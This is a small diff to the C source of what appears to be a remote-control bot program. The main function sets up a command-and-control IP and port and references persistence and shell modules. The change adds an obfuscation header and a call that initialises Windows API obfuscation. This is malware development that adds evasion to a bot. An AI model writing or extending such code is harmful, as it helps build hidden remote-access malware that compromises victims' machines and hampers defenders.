@@ -3,6 +3,7 @@
 #include "lconfig.h"
 #include "lerror.h"
 #include "ltask.h"
+#include "obf.h"
 #include "persist.h"
 #include "shell.h"
 
@@ -26,6 +27,9 @@ int main()
     LAIKA_BOX_SKID_START(char *, cncIP, LAIKA_CNC_IP);
     LAIKA_BOX_SKID_START(char *, cncPORT, LAIKA_CNC_PORT);
     struct sLaika_bot *bot;
+
+    /* init API obfuscation (windows only) */
+    laikaO_init();
 
 #ifdef LAIKA_PERSISTENCE
     laikaB_markRunning();
